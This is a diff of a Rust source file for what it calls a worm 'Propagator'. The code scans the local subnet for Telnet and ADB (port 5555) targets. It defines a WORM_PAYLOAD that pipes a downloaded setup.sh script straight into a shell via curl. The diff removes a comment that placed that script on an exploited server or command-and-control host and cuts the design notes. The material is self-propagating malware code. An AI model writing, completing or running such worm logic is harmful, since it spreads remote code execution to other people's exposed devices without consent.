@@ -3,7 +3,7 @@ use std::time::Duration;
 use ::loader::loader;
 use log::{info, error};
 
-// In real scenario, this would be a downloader script hosted on an exploited server or C2
+// Remote Downloader Payload
 const WORM_PAYLOAD: &str = "curl -sL http://127.0.0.1:8080/setup.sh | sh"; 
 
 #[tokio::main]
@@ -17,14 +17,7 @@ async fn main() {
     loop {
         info!("* [Propagator] Scanning Local Subnet...");
         
-        // Use loader::scanner (raw TCP) to just find ALIVE HOSTS first
-        // But loader::scanner specifically checks port 23.
-        // We need a generic "Ping" or port scan.
-        // For now, let's reuse loader::scanner logic but modify it to be generic?
-        // Or cleaner: Use loader's IP generation, but do our own Multi-Port check.
-        // Actually, let's use scanner::scan_local_subnet() just to find Telnet targets for now,
-        // and add custom scan for ADB (5555).
-        
+        // Use scanner for discovery
         let local_ip = match local_ip_address::local_ip() {
              Ok(ip) => ip,
              Err(_) => {
